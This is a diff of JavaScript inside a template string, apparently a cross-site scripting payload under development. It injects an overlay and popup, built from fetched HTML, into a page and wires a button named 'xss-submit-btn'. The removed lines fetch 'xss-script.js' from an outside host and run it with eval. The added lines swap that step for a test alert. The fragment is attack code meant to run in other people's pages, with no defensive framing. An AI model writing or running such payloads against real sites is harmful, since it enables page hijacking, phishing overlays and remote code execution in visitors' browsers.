@@ -50,24 +50,36 @@ console.error('Overlay or popup div not found in fetched HTML');
 return;
 }
 // Append overlay and popup to existing body
+try {
 document.body.appendChild(overlay);
 document.body.appendChild(popup);
 console.log('Overlay and popup appended to body');
-console.log('Checking if xss-submit-btn exists:', !!document.getElementById('xss-submit-btn'));
-// Fetch and eval xss-script.js
-fetch('https://data.estebanmf.space/xss-script.js')
-.then(t => t.text())
-.then(script => {
-console.log('xss-script.js fetched, content:', script);
-console.log('xss-script.js evaluating');
-try {
-eval(script);
-console.log('xss-script.js evaluated');
 } catch (e) {
-console.error('Eval failed:', e);
+console.error('Failed to append popup:', e);
+return;
 }
-})
-.catch(e => console.error('Script fetch error:', e));
+// Check DOM elements
+console.log('Checking if xss-submit-btn exists:', !!document.getElementById('xss-submit-btn'));
+// Bind simple onclick handler
+try {
+const submitBtn = document.getElementById('xss-submit-btn');
+if (!submitBtn) {
+console.error('Submit button not found');
+return;
+}
+console.log('Attaching onclick to xss-submit-btn');
+submitBtn.onclick = function () {
+try {
+console.log('Submit button clicked');
+alert('Button clicked successfully!');
+} catch (e) {
+console.error('Button click handler failed:', e);
+}
+};
+console.log('Script logic executed successfully');
+} catch (e) {
+console.error('Event listener setup failed:', e);
+}
 })
 .catch(e => console.error('HTML fetch error:', e));
 `;
